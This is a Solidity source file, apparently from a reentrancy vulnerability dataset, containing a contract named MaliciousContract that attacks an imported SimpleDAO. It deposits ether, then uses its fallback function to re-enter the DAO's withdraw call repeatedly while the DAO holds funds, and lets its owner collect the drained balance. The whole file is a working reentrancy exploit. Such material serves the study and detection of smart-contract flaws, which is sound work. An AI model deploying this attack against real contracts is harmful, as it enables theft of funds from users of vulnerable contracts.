pragma solidity ^0.4.2;

import "../dataset/reentrancy/simple_dao.sol";

contract MaliciousContract {
    SimpleDAO public dao;
    address public owner;

    constructor(address _daoAddress) {
        dao = SimpleDAO(_daoAddress);
        owner = msg.sender;
    }

    function attack(uint256 attack) public payable {
        require(attack > 0);
        dao.withdraw(attack);
    }
    function deposit() public payable {
        require(msg.value >= 1);
        dao.donate.value(msg.value)(this);
    }

    function() public payable {
        if (address(dao).balance >= msg.value) {
            dao.withdraw(msg.value);
        }
    }

    function collectRemaining() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}
